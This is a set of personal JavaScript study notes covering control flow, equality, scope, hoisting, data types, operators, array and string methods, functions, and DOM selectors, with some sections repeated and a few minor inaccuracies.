Control structures in programming :
1.Conditional Statements : If Statement If-Else Statement Else-If Statement Switch Statement 
2.Loops : For Loop, While Loop, Do-While Loop, For...In Loop, For...Of Loop 
3.Jump Statements : Break Continue Return Throw Exception Handling : Try-Catch Finally 
4.Ternary Operator :
5.Logical Operators : Logical AND (&&) Logical OR (||) Logical NOT (!)

Simple equality operator only checks value of the variables that we want to compare while strict equality operator checks both value & data type of variables that we want to compare.
For example we have variable declared like let x=null & another variable like let y. When we try to compare both with equality operator it will return true but if we use strict equality operator it will return false because it checks for data type also. 

Null Vs Undefined : primitive, defn, typeof, comparison(tell above example)
Both of these are primitive data types in javascript.
When we declare a variable without assigning any value to it then the default value is undefined.For example if we declare a variable like let x & does not assign any value to it, then it will be undefined.
Null indicates intentional absense of value. When you have variable or object which you want to make empty then we assign 'null' to that variable or object.We use null explicitly which indicates "no value" or "empty value" in a code. 

When we try to check data type of undefined using typeof operator it returns undefined while if you try to check it for null, it will return empty object. (which is for ensuring backward compatibility with older code.)

Scope of variable means it is a lifetime or availability of a variable. The Scope of a variable is decided by its location in the code. When we declare a variable inside the function then it can be accessible within that function & can be accessible in all blocks within that function. But it is not accessible outside of the function due to function scope.
When we declare variable within a block like if-else, try-catch or for loop then it is accessible only inside that block only not outside of that particular block due to block scope.
When we declare a variable outside of all the functions & blocks in the main code then it is accesible to all the functions & blocks due to global scope. 

Hoisting means variable and function declarations are moved to the top of their containing scope during the execution phase. 
Function declarations are hoisted completely including its body means we can call the function before its actual declaration in the code & still it will work same as if you declared the function first and then called it.
Variables declared with var keyword are hoisted to the top of their scope but are initialized with undefined meaning they exist, but have no value assigned until the code execution reaches the initialization point.
Variables declared with let and const keyword are hoisted, but unlike var, they are not initialized to undefined.They are in a "temporal dead zone" from the start of the block until the declaration is encountered, meaning accessing them before the declaration results in a ReferenceError.


####################### 
JavaScript is a programming language that is used for converting static web pages to interactive and dynamic web pages. A JavaScript engine is a program present in web browsers that executes JavaScript code.

A client is a device, application, or software component that requests and consumes services or resources from a server.
A server is a device, computer, or software application that provides services, resources, or functions to clients.

Variables are used to store data.var creates a function-scoped variable.let creates a block-scoped variable.const can be assigned only once, and its value cannot be changed afterwards.

substr(): Returns a part of the string, starting from a specified index and optionally a length.
indexOf(): Returns the first index of a specified value in the string, or -1 if not found.
trim(): Removes whitespace from both ends of the string.
substring(): Extracts a portion of the string between two specified indices.
includes(): Checks if a specified substring exists within the string, returning true or false.
charAt(): Returns the character at a specified index in the string.
replace(): Replaces a specified substring with another string.
slice(): Extracts a section of the string, between two specified indices.
valueOf(): Returns the primitive value of the string (usually the string itself).
search(): Searches for a specified pattern in the string and returns the index of the match, or -1 if not found.
concat(): Joins two or more strings together.
split(): Splits the string into an array of substrings based on a specified separator.
toLocaleLowerCase(): Converts the string to lowercase, respecting locale-specific case mappings.
lastIndexOf(): Returns the last index of a specified substring, or -1 if not found.
toString(): Returns the string representation of the object.
toLocaleUpperCase(): Converts the string to uppercase, respecting locale-specific case mappings.
charCodeAt(): Returns the Unicode value (character code) of the character at the specified index.
match(): Searches the string for a match to a regular expression and returns the result as an array.

The DOM(Document Object Model) represents the web page as a tree-like structure that allows JavaScript to dynamically access and manipulate the content and structure of a web page.

Selectors in JS help to get specific elements from DOM based on IDs, class names, tag names.
getElementById(id): Retrieves a single element with the specified id attribute. Returns: A single element (or null if no element is found with that ID)
getElementsByClassName(className): Retrieves all elements that have the specified class name. Returns: A live HTMLCollection (an array-like object) of all elements with the specified class name.
getElementsByTagName(tagName): Retrieves all elements of the specified tag name (e.g., div, p, etc.). Returns: A live HTMLCollection of all elements with the specified tag name.

A data type determines the type of variable.
Primitive types are immutable and directly hold values, while non-primitive types are mutable and hold references to their values.
Primitive Types: String, Number, BigInt, Boolean, undefined, null, Symbol
Non-Primitive Types: Object, Array, Function, Date, RegExp

Operators are symbols or keywords used to perform operations on operands
Arithmetic : Performs mathematical operations on numbers Example: +, -, *, /, %
Assignment : Assigns values to variables. Example: =, +=, -=, *=, /=
Comparison : Compares two values and returns a boolean result (true or false). Example: ==, ===, !=, !==, <, >, <=, >=
Logical : Performs logical operations, typically returning a boolean result based on conditions. Example: && (AND), || (OR), ! (NOT)
String : Used to manipulate and work with strings, such as concatenation or accessing specific characters. Example: + (concatenation), length, charAt(), substring()

A conditional statement allows the execution of different code blocks based on whether a specified condition is true or false.
if-else : A conditional statement that executes one block of code if a condition is true and another block if it is false. 
ternary : A shorthand for an if-else statement, evaluating a condition and returning one of two values based on whether the condition is true or false. Example: condition ? valueIfTrue : valueIfFalse
Switch : A control statement that evaluates an expression and executes code based on matching cases, offering a cleaner alternative to multiple if-else conditions.

A loop is a programming way to run a piece of code repeatedly until a certain condition is met.
for: A loop that repeats a block of code a specified number of times based on a counter or condition.
    Example: for (let i = 0; i < 5; i++) { // code }
while: A loop that continues executing a block of code as long as a specified condition is true.
    Example: while (condition) { // code }
do-while: A loop that executes a block of code at least once, then repeats as long as the condition is true.
    Example: do { // code } while (condition);
for...of: A loop that iterates over the values of an iterable object (like arrays, strings, etc.).
    Example: for (const value of array) { // code }
for...in: A loop that iterates over the keys or properties of an object.
    Example: for (const key in object) { // code }

A function is a reusable block of code that performs a specific task. It contains Function name, Parameters list, Function body with return statement, Function call, Argument list.
Named function: A function that is defined with a specific name, used for invoking and referencing within the code.
    Example: function greet() { return "Hello"; }
Anonymous function: A function that is defined without a name, often used as a parameter or callback.
    Example: const greet = function() { return "Hello"; };
Function expression: A function that is defined and assigned to a variable, can be named or anonymous.
    Example: const greet = function() { return "Hello"; };
Arrow function: A shorthand syntax for defining functions, using the => operator, with lexically bound this.
    Example: const greet = () => "Hello";
IIFE (Immediately Invoked Function Expression): A function that is defined and immediately invoked as soon as it's defined.
    Example: (function() { console.log("Hello"); })();
Callback function: A function passed as an argument to another function, to be executed later after some operation completes.
    Example: setTimeout(() => console.log("Hello"), 1000);
Higher-order function: A function that accepts other functions as arguments or returns a function as a result.
    Example: const higherOrder = (func) => func();

An array is a data type that allows you to store multiple values in a single variable. It contains elements & their indexes.
Array methods :
1.GET ELEMENT FROM ARRAY :
indexOf: Returns the first index of a specified value in a string or array, or -1 if not found.
    Example: array.indexOf(3);
find: Returns the first element in an array that satisfies a provided testing function.
    Example: array.find(item => item > 2);
filter: Creates a new array with all elements that pass the test implemented by the provided function.
    Example: array.filter(item => item > 2);
slice: Extracts a shallow copy of a portion of an array or string, without modifying the original.
    Example: array.slice(1, 3);
2.ADD ELEMENT TO ARRAY :
push: Adds one or more elements to the end of an array and returns the new length of the array.
    Example: array.push(4);
concat: Merges two or more arrays or values into a new array without modifying the original arrays.
    Example: array.concat([5, 6]);
unshift: Adds one or more elements to the beginning of an array and returns the new length of the array, modifying the original array.
    Example: array.unshift(1, 2);
3.REMOVE ELEMENT FROM ARRAY :
pop: Removes the last element from an array and returns it, modifying the original array.
    Example: const removed = array.pop();
shift: Removes the first element from an array and returns it, modifying the original array.
    Example: const removed = array.shift();
splice: Changes the contents of an array by removing or replacing existing elements and/or adding new elements at a specified index.
    Example: array.splice(2, 1, 'newItem');
4.MODIFY ELEMENTS OF ARRAY :
map: Creates a new array by applying a function to each element of the original array, leaving the original array unchanged.
    Example: const doubled = array.map(item => item * 2);
forEach: Executes a provided function once for each element in the array, but does not return a new array and does not modify the original array.
    Example: array.forEach(item => console.log(item));
5.OTHER METHODS OF ARRAY :
join: Combines all elements of an array into a single string, with a specified separator between them.
    Example: const str = array.join(',');
length: Returns the number of elements in an array or the number of characters in a string.
    Example: const len = array.length;
sort: Sorts the elements of an array in place and returns the sorted array.
    Example: array.sort((a, b) => a - b);
reverse: Reverses the order of the elements in an array in place.
    Example: array.reverse();
reduce: Applies a function to accumulate a single result from an array by processing each element.
    Example: const sum = array.reduce((acc, item) => acc + item, 0);
some: Tests whether at least one element in the array satisfies the provided condition, returning true or false.
    Example: const hasNegative = array.some(item => item < 0);
every: Tests whether all elements in the array satisfy the provided condition, returning true or false.
    Example: const allPositive = array.every(item => item > 0);

An object is a data type that allows you to store key-value pairs. In javascript object keys are always strings & values can be any data type including primitive as well as referenced data type.We can define function inside the object which is called as method.

Scope determines where variables are defined and where they can be accessed.
Global Scope: Variables declared outside of any function or block are in the global scope, meaning they can be accessed anywhere in the code.
    Example: let globalVar = "I am global";
Function Scope: Variables declared inside a function are only accessible within that function, not outside.
    Example: function myFunction() { let funcVar = "I am inside a function"; }
Block Scope: Variables declared inside a block (e.g., within {} of loops or conditionals) using let or const are only accessible within that block.
    Example: if (true) { let blockVar = "I am in a block"; }

Hoisting is a JavaScript behavior where functions and variable declarations are moved to the top of their respective scopes during the compilation phase.There are two kind of hoisting in javascript :
1.Function Hoisting: In JavaScript, function declarations are hoisted to the top of their scope, meaning they can be called before their actual declaration in the code.
    Example : greet(); // Works fine
              function greet() { console.log("Hello"); }
2.Variable Hoisting: Variable declarations (using var) are hoisted to the top, but only the declaration part, not the assignment, meaning the variable is undefined until assigned a value.
    Example : console.log(x); // undefined
              var x = 10;
Both let and const are hoisted to the top of their block scope, but they are not initialized until the code execution reaches their declaration. This results in a "temporal dead zone" (TDZ) where accessing them before the declaration throws a ReferenceError.
    Example : console.log(x); // ReferenceError: Cannot access 'x' before initialization
              let x = 10;

Error handling is the process of managing errors. In javascript we use try-catch block to handle errors, try block contains the code that might throw error while catch block is where the error is handled.

JSON (JavaScript Object Notation) is a lightweight data interchange format between a server and client. JSON consists of key-value pairs.JSON requires double quotes for keys and string values. 
JSON Vs Objects :
JSON is a data format that represents structured data as text, while JavaScript object is a data structure that is used to store data in key-value pair.
JSON requires double quotes for keys and string values, while JavaScript object keys are always converted to strings, regardless of whether you use single quotes, double quotes, or no quotes at all.(we can use number or boolean values as a key in a object but javascript will convert it to string).
JSON to Object: Use JSON.parse() to convert JSON (string) into a JavaScript object. 
    Example : const obj = JSON.parse(jsonString);
Object to JSON: Use JSON.stringify() to convert a JavaScript object into a JSON (string).
    Example : const jsonString = JSON.stringify(objectName);

Asynchronous programming allows multiple tasks or operations to be initiated and executed concurrently. Asynchronous operations do not block the execution of the code.
Used of Asynchronous programming : 
1.Fetching Data from API : 
    Example : fetch('https://api.example.com/data').then(response => response.json()).then(data => console.log(data));
2.Downloading Files :
    Example : const downloadFile = async () => { const response = await fetch('file_url'); const blob = await response.blob(); saveAs(blob, 'file.png'); };
3.Uploading Files :
    Example : const uploadFile = async (file) => { const formData = new FormData(); formData.append('file', file); await fetch('/upload', { method: 'POST', body: formData }); };
4.Animations and Transitions :
    Example : const animate = async () => { await new Promise(resolve => setTimeout(resolve, 1000)); document.getElementById('element').style.transform = 'scale(1.2)'; };
5.Time taking operations
    Example : const longOperation = async () => { await new Promise(resolve => setTimeout(resolve, 5000)); console.log('Operation Completed'); };



### VARIABLES :
Variables are used to store data.var creates a function-scoped variable. let creates a block-scoped variable.const can be assigned only once, and its value cannot be changed afterwards.
A data type determines which kind of value variable can hold
There are two categories of data types in javascript :
1.Primitive types & 2.Non-Primitive or Referenced Types
Primitive Types: String, Number, BigInt, Boolean, undefined, null, Symbol
Non-Primitive Types: Object, Array, Function, Date, RegExp
Primitive data types can hold only single value and are immutable meaning their values, once assigned, cannot be changed.and while non-primitive types can hold only single value and are mutable means their values can be changed.

Undefined Vs Null :
Null Vs Undefined : primitive, defn, typeof, comparison(tell above example)
Both of these are primitive data types in javascript.
When we declare a variable without assigning any value to it then javascript automatically initialize that variable with the default value 'undefined'.For example if we declare a variable like let x & does not assign any value to it, then it will be undefined.
Undefined can be used when you don’t have the value right now, but you will get it after some logic or operation.
Null indicates intentional absense of value. When you have variable or object which you want to make empty then we assign 'null' to that variable or object.We use null explicitly which indicates "no value" or "empty value" in a code.Null can be used, when you are sure you do not have any value for the particular variable.
For example we have variable declared like let x=null & another variable like let y. When we try to compare both with equality operator it will return true but if we use strict equality operator it will return false because it checks for data type also. 

typeof operator is used to determine the data type of variable. It is used to validate the data received from external sources like api. It always returns data type in a string except null which returns empty object.
Example : if (typeof apiData === 'object' && apiData !== null) {
                console.log('Received valid object data from API');
            }

Falsy values : false, 0 (zero), "" (empty string), null, undefined, NaN, 0n (BigInt zero)
These values are always treated as false in javascript regardless of their actual type. This means that if any of these values are used in a condition  like an if statement, they will be considered as false.
IMP : if block only executes when the condition evaluates to a truthy value.

NaN (Not-a-Number) is a special value that represents an invalid or undefined number.
Examples :
    let result2 = Math.sqrt(-1); // NaN
    let num = parseInt("Hello"); // NaN
    let num = NaN + 5; // NaN
To check if a value is NaN, use isNaN() or the Number.isNaN() method. isNaN() converts the value to a number before checking, while Number.isNaN() checks strictly whether the value is exactly NaN. Its better to use Number.isNaN()
Example :
    let value2 = "Hello";
    console.log(isNaN(value2)); // true, but this is because "Hello" is converted to NaN internally
    console.log(Number.isNaN(value2)); // false    
    console.log(NaN === NaN); // false    
    console.log(NaN == NaN); // false  
    console.log(Object.is(NaN, NaN)); // true

Type coercion is the automatic conversion of values from one data type to another during operations like concatination or comparisons.
    String + Number --> Number
    Number + Boolean --> Number (true is 1 & false is 0)
    Boolean + String --> String
    Undefined + Number --> NaN 
    Null + Number --> Number (null treated as zero '0')
To avoid type coercion : 
1.Use Explicit Type Conversion : Number(str), String(num), Boolean()
2.Use strict equality operator (===)
3.Use Template Literals for Concatenation : console.log(`${str} ${num}`); // "Hello 10"
4.Always check for null and undefined values explicitly : if (n !== null && n !== undefined) {}
5.Avoid Using + for Both Strings and Numbers : 
    let num = 10;
    let str = "5";
    let result = Number(str) + num; // 15
6.Use Object.is() for Comparison : It behaves similarly to strict equality but handles special cases like NaN and -0.
    let a = NaN;
    let b = NaN;
    console.log(Object.is(a, b)); // true (NaN === NaN is false with ===, but Object.is() works)
7.Use Number.isNaN() to Detect NaN : Number.isNaN(value)
8.Use parseInt() and parseFloat() Carefully
    let str = "123abc";
    let num = parseInt(str);
    console.log(num); // 123 (non-numeric part is ignored)


### OPERATORS :
Operators are symbols or keywords used to perform operations on operands.

Type of Operators :
Arithmetic : Performs mathematical operations on numbers Example: +, -, *, /, %  ( ** means square)
    To calculate square or cube square or cube root use Math.pow()
    Example : let result = Math.pow(25, 1/3);  // 5 cube root
              let result = Math.pow(5, 2); // 25
Assignment : Assigns values to variables. Example: =, +=, -=, *=, /=  ( x+=5 means x = x + 5 )
Comparison : Compares two values and returns a boolean result (true or false). Example: ==, ===, !=, !==, <, >, <=, >=
    Loose Inequality : != allows type coercion, so 5 != '5' returns false.
    Strict Inequality : !== does not allow type coercion, so 5 !== '5' returns true.
Logical : Performs logical operations, typically returning a boolean result based on conditions. Example: && (AND), || (OR), ! (NOT)
String : Used to manipulate and work with strings, such as concatenation or accessing specific characters. Example: + (concatenation), length, charAt(), substring()

Operators based on number of operands :
Unary Operator : A unary operator operates on a single operand.It performs an operation on a single value and returns a result.
    Increment (++) : Increases the value of a variable by 1. Example let x = 5; x++;  // x becomes 6
    Decrement (--) : Decreases the value of a variable by 1. Example let x = 5; x--;  // x becomes 4
    Unary Plus (+) : Converts a variable to a number. Example let str = "10"; let num = +str;  // num becomes 10 (number)
    Unary Negation (-) : Negates a value (changes its sign). Example : let x = 5; let y = -x;  // y becomes -5
    Logical NOT (!) : Converts a value to a boolean and negates it. Example : let x = true; let y = !x;  // y becomes false
Binary Operator : Binary operators work with two operands and are typically used in arithmetic, comparison, and logical operations. 
    ** used for power
Ternary Operator : The ternary operator is a concise way to write simple if-else conditions. It takes three operands: a condition, a result for true, and a result for false.
    let score = 85;
    let grade = score >= 90 ? "A" : score >= 75 ? "B" : "C";  // grade = "B"

Short-circuit evaluation is a programming concept in logical expressions where the evaluation of the expression stops as soon as the result is determined, without evaluating the remaining expressions.
1.Logical AND (&&) :
It evaluates expressions from left to right and stops as soon as it encounters the first falsy value, because the result of the entire expression will be false. If all values are truthy, the last value is returned.
    console.log(0 && NaN && undefined && '' && 'vbn');
2.Logical OR (||):
It evaluates expressions from left to right and stops as soon as it encounters the first truthy value, because the result of the entire expression will be true. If all values are falsy, the last value is returned.
    console.log(0 || NaN || undefined || '' || 'vbn');

As per operator precedence, operators with higher precedence are evaluated first. The order of precedance is BODMAS.

Conditional statements : These statements executes the different code blocks based on specified condition either true or false.
if-else : if block gets executed if the condition evaluates to true or has a truthy value, else block gets executed if the condition evaluates to false or has a falsy value, else-if block is used to add additional or multiple conditions.
ternary : A shorthand for an if-else statement, evaluating a condition and returning one of two values based on whether the condition is true or false. 
    Example: condition ? valueIfTrue : valueIfFalse
    let grade = score >= 90 ? "A" : score >= 75 ? "B" : "C";  // grade = "B"
Switch : The switch statement is used to evaluate a single expression against multiple possible cases. If expression matches the case then the block of code associated with that case gets executed.If none of the cases match with expression then default block is executed.
It uses strict equality operator for case matching with expression. break keyword used to exit the switch statement, if we do not use break statment it will execute all the subsequent cases even if match found or not.

Loose equality operator only checks value of the variables that we want to compare & performs type coercion on the values while Strict equality operator checks both value & data type of variables that we want to compare & does not performs type coercion on the values.
The loose equality operator (==) considers null and undefined to be equal while Strict equality operator does not consider them equal.
The "[object Object]" is the default string representation of a JavaScript object when it is coerced to a string.
    Example    const obj = { name: 'John' };
               console.log(obj.toString());  // Output: [object Object]
For object & primitive comparison Loose equality operator performs type coercion while Strict equality operator does not performs type coercion.
Example: const obj = { name: 'John' };
         console.log(obj == '[object Object]');  // true 
         console.log(obj === '[object Object]');  // false 
Strict equality operator is mostly preffered.

Spread Vs Rest :
The spread operator(...) is used to expand or spread elements from an iterable (such as an array, string, or object) into individual elements. It is mostly used for copying array as well as object(shallow copy does not deeply copy nested propeties or elements instead referenced), merging objects as well as arrays, passing multiple arguments to the functions.
The rest operator (...) is used to collect multiple elements into a single variable.It is mostly used in function parameters for collecting multiple arguments & for array & object destructuring to collect the rest of properties of object or rest of elements of array.
The rest operator (...) must always be the last parameter in a function or the last element when destructuring. If it's not, you'll get a syntax error.

#### ARRAYS :
An array is a data type that allows you to store multiple values in a single variable.It is ordered collection of elements where each element is stored at a specific index (starting from 0).So we can easily access elements of array using their index number.

Array methods :
1.GET ELEMENT FROM ARRAY :
indexOf: Returns the first index of a specified value in a string or array, or -1 if not found.
    Example: array.indexOf(3);
find: Returns the first element in an array that satisfies a provided testing function.
    Example: array.find(item => item > 2);
filter: Creates a new array with all elements that pass the test implemented by the provided function.
    Example: array.filter(item => item > 2);
slice: Extracts a shallow copy of a portion of an array or string, without modifying the original.
    Example: array.slice(1, 3);
2.ADD ELEMENT TO ARRAY :
push: Adds one or more elements to the end of an array and returns the new length of the array.
    Example: array.push(4);
concat: Merges two or more arrays or values into a new array without modifying the original arrays.
    Example: array.concat([5, 6]);
unshift: Adds one or more elements to the beginning of an array and returns the new length of the array, modifying the original array.
    Example: array.unshift(1, 2);
3.REMOVE ELEMENT FROM ARRAY :
pop: Removes the last element from an array and returns it, modifying the original array.
    Example: const removed = array.pop();
shift: Removes the first element from an array and returns it, modifying the original array.
    Example: const removed = array.shift();
splice: Changes the contents of an array by removing or replacing existing elements and/or adding new elements at a specified index.
    Example: array.splice(2, 1, 'newItem');
4.MODIFY ELEMENTS OF ARRAY :
map: Creates a new array by applying a function to each element of the original array, leaving the original array unchanged.
    Example: const doubled = array.map(item => item * 2);
forEach: Executes a provided function once for each element in the array, but does not return a new array and does not modify the original array.
    Example: array.forEach(item => console.log(item));
5.OTHER METHODS OF ARRAY :
join: Combines all elements of an array into a single string, with a specified separator between them.
    Example: const str = array.join(',');
length: Returns the number of elements in an array or the number of characters in a string.
    Example: const len = array.length;
sort: Sorts the elements of an array in place and returns the sorted array.
    Example: array.sort((a, b) => a - b);
reverse: Reverses the order of the elements in an array in place.
    Example: array.reverse();
reduce: Applies a function to accumulate a single result from an array by processing each element.
    Example: const sum = array.reduce((acc, item) => acc + item, 0);
some: Tests whether at least one element in the array satisfies the provided condition, returning true or false.
    Example: const hasNegative = array.some(item => item < 0);
every: Tests whether all elements in the array satisfy the provided condition, returning true or false.
    Example: const allPositive = array.every(item => item > 0);

find Vs filter : 
find method returns first element from the array that matches the given condition, if no match found it returns undefined. 
filter method returns returns all the elements from the array that matches the given condition & if no match found it returns empty array.
Syntax : array.find(callback(element, index, array), thisArg);
         array.filter(callback(element, index, array), thisArg);

Slice() : array.slice(startIndex, endIndex);
The slice() method is used to extract a portion of an array or a string and returns a new array or string without modifying the original.We need to give startIndex & endIndex, endIndex will not be included in the result. If endIndex not provided it slices till the end of the array.Supports negative indexes.
    slice() : this creates shallow copy of array 

Splice() : array.splice(startIndex, deleteCount, item1, item2, ...);
The splice() method is used to modify an array by adding or removing or replacing elements. It modifies the original array.
It returns array containing the removed elements.
1.To remove element : use startIndex & deleteCount (1 to delete single element)
2.To add elements : use startIndex, deleteCount(0), item1, item2
3.To replace elements : use startIndex, deleteCount(non-zero), item1, item2 (deletCount must be equal to item numbers)
4.To remove all elements: array.splice(0, numbers.length);

slice Vs splice :
    slice() extracts a portion of an array without modifying the original.
    splice() modifies the original array by adding, removing, or replacing elements.
    slice() returns a new array with the selected elements.
    splice() returns an array containing the removed elements (if any).
    slice() does not modify the original array.
    splice() modifies the original array.
    slice() supports negative indices (counting from the end).
    splice() does not support negative indices for deletion but can use them for adding elements.

map vs forEach :
map method used when you want to modify each element of array & create a new array with the modified values based on condition provided in callback function.It does not mutate original array & returns new array with modified version, so we can chain map method with other methods.
forEach method used to iterate over an array and perform some operation on each element of array, without creating a new array.The break and continue statements cannot be used inside a forEach loop.It does not mutate the original array but it could if elements are modified within the callback function.It returns undefined, so we can not chain forEach method with other methods. It is mostly used for performing side effects such as logging, UI updates, modifying external variables.
Syntax :
        array.map(callback(currentValue, index, array) { // code to execute for each element })
        array.forEach(callback(currentValue, index, array) { // code to execute for each element })

sort Vs reverse :
Sort method first converts the elements of array into string & then sort them in unicode order (lexicographically).For more accurate sorting we need to provide compareFunction.It modifies original array & returns sorted array.
To sort numbers in ascending order : array.sort((a, b) => a - b)
To sort numbers in descending order : array.sort((a, b) => b - a)

The reverse() method reverses the order of the elements in original array without creating a new array.It modifies the original array & returns reversed array.

Both methods modify the original array directly. To avoid altering the original array, use the spread operator to create a copy first, then apply the reverse() or sort() method on the copied array.

Array destructuring allows you to extract elements from an array and assign them to individual variables in a single statement.It is introduced in ECMAScript 6 (ES6).

Array-like objects are objects that have indexed elements and a length property, similar to arrays, but they may not have all the methods of arrays like push(), pop() & others.
For example arguments object, strings, nodelist, HTML collections etc are array-like objects. To convert these array-like objects into array 
    1.using from() method.
    const array1 = Array.from(arrayLike);
    2.Spread :
    const array2 = [ ...arrayLike ]
    3.Array prototype :
    const array3 = Array.prototype.slice.call(arrayLike);

#### LOOPS :
A loop is a control structure which allows you to run a piece or block of code repeatedly until a specified condition is met.It basically automate repetitive tasks, process data, or perform iterations over arrays, objects & strings.
When to use which loop :
For Loop: 
    For loop allows to iterate a block of code a specific number of times
    Use when the number of iterations is known or you need to access elements by index.
While Loop: 
    While loop execute a block of code while a certain condition is true.
    Use when the number of iterations is uncertain and depends on a dynamic condition.
Do-While Loop: 
    The do-while loop is similar to the while loop, except that the block of code is executed at least once, even if the condition is false.
    Use when the loop must run at least once.
For...In Loop: 
    for…in loop is used to loop through the properties of an object.It allows you to iterate over the keys of an object and access the values associated by using keys as the index.
    Use when iterating over object properties.
For...Of Loop: 
    for…of loop is used to loop through the values of an object like arrays, strings.It allows you to access each value directly, without having to use an index
    Use when iterating over iterable objects like arrays or strings.
forEach :
    forEach method iterate over each element of the array and perform some action on each element.It does not have break & continue statements.
break statement :
    The "break" statement is used to terminate or exits the loop immediately
continue statement :
    The "continue" statement is used to skip the current iteration of the loop and move on to the next iteration.


#### FUNCTIONS :
'this' object : it contains or refers to the current context.
In global context : this keyword points to global or window object in non-srict mode, in strict mode it returns undefined
In regular function : this keyword points to global or window object in non-srict mode, in strict mode it returns undefined
In methods : this keyword refers to the object calling the method, not the object having the method. For example, when a method is borrowed from the first object by the second object, calling the method on the second object will make the this keyword point to the second object.
In arrow function : this keyword is lexically inherited from surrounding context or outer scope
In Constructor Functions : this keyword points to the instance created from that constructor function
In Classes : this keyword points to the instance created from that class
In Event Handlers : this keyword points to the element that triggered the event. 

A function is a reusable block of code that performs a specific task. It contains Function name, Parameters list, Function body with return statement, Function call, Argument list.
Parameters are the placeholders defined in the function declaration.Arguments are the actual values passed to a function when it is invoked or called.
Default parameters allow you to specify default values for function parameters
First class functions in javascript : When function is treated as variable. Example we can assign function to a variable (function expression), callback function are passed as argument to other function, returning function from higher order function.

Ways to pass arguments to the function :
1.Positional Arguments: arguments are passed in the order that the function parameters are defined.
2.Named Arguments: You can pass an object to a function, which is useful for passing multiple arguments or optional parameters.
3.Arguments object : The arguments object is an array-like object that holds all arguments passed to a function. It's useful for older JavaScript versions, though rest parameters are generally preferred now.
4.Rest parameters :
5.Default parameters :
6.Callback function :
7.Destructuring Arguments :
8.Array Arguments :

Types of functions : 
Named function: 
    When we defined the function with a specific name it is named function. 
    Mostly used for big & complex logic
    Use it when when you want to reuse one function at multiple places like invoking and referencing within the code.
    Example: function greet() { return "Hello"; }
Anonymous function: 
    A function that is defined without a name, often used as a parameter or callback.
    Use anonymous functions for small logics
    Use when want to use a function in a single place
    Example: const greet = function() { return "Hello"; };
Function expression: 
    A function that is defined and assigned to a variable, can be named or anonymous.
    Example: const greet = function() { return "Hello"; };
Arrow function: 
    Arrow function is actually a function expression with more concise syntax
    It does not have its own this keyword, arguments object, super keyword or can not be used as constructor function.
    The this keyword is lexically inherited from the surrounding context or outer scope, and the spread operator (...args) can be used as an alternative to the arguments object.
    Example: const greet = () => "Hello";
IIFE (Immediately Invoked Function Expression): 
    A function that is defined and immediately invoked as soon as it's defined.
    Example: (function() { console.log("Hello"); })();
Callback function: 
    A function that is passed as an argument to another function, to be executed later after some operation completes.
    Example: setTimeout(() => console.log("Hello"), 1000);
Higher-order function: 
    A function that accepts other functions as arguments or returns a function as a result.
    Example: const higherOrder = (func) => func();
Pure function :
    A pure function is a function that always produces the same output for the same input.It does not cause any side effects like it does not modify external variables, objects, or global state
Impure function :
    An impure function is a function that may produce different outputs for the same input. It may cause side effects like modifying a global variable, changing a parameter, interacting with a database or network
    The function may alter the external state or rely on external variables.The function’s behavior might change based on external states or data.
Function currying :
    If we have function with multiple parameters, then in currying we break down that function into chain or series of functions in which each function takes one paramter & returns a new function. This will continued until all arguments of function are provided.
    Currying is the technique in which allows us to break down a function that takes multiple parameters, into a chain or series of functions, that each take one parameter, & return a new function until all arguments are provided.
    It is basically a way to partially call a function by pre-applying some of the parameters and leaving the rest parameters to be provided later.
    Example : 
        const priceCalc = price => discount => price * discount;
        const discAmount = priceCalc(300);
        console.log(discAmount(0.5));
        console.log(discAmount(0.3));
    If you have multiple parameters & out of them some parameters are changing & some are fixed then we pass the fixed parameters to the curried function first & then apply changing parameters later.
        const applyTax = tax => price => discount => (price - discount) + tax;
        const applyTax10 = applyTax(10);  // tax is fixed to 10
        console.log(applyTax10(100)(5));  // Output: 105 (100 - 5 + 10)
        console.log(applyTax10(200)(20)); // Output: 190 (200 - 20 + 10)


#### STRINGS :
A string is a data type used to store and manipulate sequences of characters, such as words or sentences.
Template literals are a method for creating strings in JavaScript using backticks (``). String interpolation is the process of embedding expressions or variables within a string using ${} inside template literals. This allows you to dynamically insert values into strings, making the code more readable and concise.
Strings in JavaScript are considered immutable because you cannot modify the contents of an existing string directly. Instead, any operation that appears to modify a string actually creates a new string.
We can concatinate strings using : 1.'+' operator 2.concat() method 3.template literals 4.join() method
String methods :
substr(): Returns a part of the string, starting from a specified index and optionally a length.
    str.substr(startIndex, length)
indexOf(): Returns the first index of a specified value in the string, or -1 if not found.
    str.indexOf(searchValue, startIndex)
trim(): Removes whitespace from both ends of the string.
    str.trim()
substring(): Extracts a portion of the string between two specified indices.
    str.substring(startIndex, endIndex)
includes(): Checks if a specified substring exists within the string, returning true or false.
    str.includes(searchValue)
charAt(): Returns the character at a specified index in the string.
    str.charAt(index)
replace(): Replaces a specified substring with another string.
    str.replace(searchValue, newValue)
slice(): Extracts a section of the string, between two specified indices.
    str.slice(startIndex, endIndex)
valueOf(): Returns the primitive value of the string (usually the string itself).
    str.valueOf()
search(): Searches for a specified pattern in the string and returns the index of the match, or -1 if not found.
    str.search(pattern)
concat(): Joins two or more strings together.
    str.concat(string1, string2, ...)
split(): Splits the string into an array of substrings based on a specified separator.
    str.split(separator)
toLocaleLowerCase(): Converts the string to lowercase, respecting locale-specific case mappings.
    str.toLocaleLowerCase()
lastIndexOf(): Returns the last index of a specified substring, or -1 if not found.
    str.lastIndexOf(searchValue)
toString(): Returns the string representation of the object.
    str.toString()
toLocaleUpperCase(): Converts the string to uppercase, respecting locale-specific case mappings.
    str.toLocaleUpperCase()
charCodeAt(): Returns the Unicode value (character code) of the character at the specified index.
    str.charCodeAt(index)
match(): Searches the string for a match to a regular expression and returns the result as an array.
    str.match(pattern)


#### DOM :
The DOM(Document Object Model) represents the web page as a tree-like structure that allows JavaScript to dynamically access and manipulate the content and structure of a web page.
Selectors in JS help to get specific elements from DOM based on IDs, class names, tag names. Examples getElementById, getElementsByClassName, getElementsByTagName, querySelector, querySelectorAll.
DOM methods : to select, modify, create and remove DOM elements
1.Select DOM elements :
getElementById(id) : Selects a single element by its ID.
    Syntax: document.getElementById('id')
    Example: const element = document.getElementById('myId')
querySelector(selector): Selects the first element that matches the specified CSS selector.
    Syntax: document.querySelector('selector')
    Example: const element = document.querySelector('.myClass')
querySelectorAll(selector): Selects all elements that match the specified CSS selector.
    Syntax: document.querySelectorAll('selector')
    Example: const elements = document.querySelectorAll('.myClass')
getElementsByClassName(className): Selects all elements with the specified class name.
    Syntax: document.getElementsByClassName('className')
    Example: const elements = document.getElementsByClassName('myClass')
